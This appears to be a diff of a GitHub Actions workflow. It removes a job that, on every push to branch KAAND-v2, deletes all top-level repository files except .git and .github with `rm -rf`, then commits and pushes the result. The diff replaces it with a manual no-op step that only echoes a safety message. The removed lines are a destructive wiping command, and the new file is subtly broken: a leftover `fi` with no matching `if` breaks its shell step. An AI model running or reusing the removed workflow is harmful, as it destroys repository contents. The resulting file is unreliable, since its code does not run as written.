@@ -1,33 +1,12 @@
-name: Delete Files on Push
+name: Repository Safety Notice
 on:
-  push:
-    branches:
-      - KAAND-v2
-
-permissions:
-  contents: write
+  workflow_dispatch:
 
 jobs:
-  clean-repo:
+  safety-notice:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
-        with:
-          fetch-depth: 0
-
-      - name: Delete all files except workflows and git config
+      - name: Confirm protected repository workflow
         run: |
-          find . -maxdepth 1 ! -name '.github' ! -name '.git' ! -name '.' -exec rm -rf {} +
-
-      - name: Commit and push changes
-        run: |
-          git config --global user.name "github-actions[bot]"
-          git config --global user.email "github-actions[bot]@users.noreply.github.com"
-          git add -A
-          if ! git diff-index --quiet HEAD; then
-            git commit -m "chore: remove all application files on push"
-            git push origin KAAND-v2
-          else
-            echo "No changes detected, repository is already clean."
+          echo "This workflow intentionally performs no repository mutations."
           fi
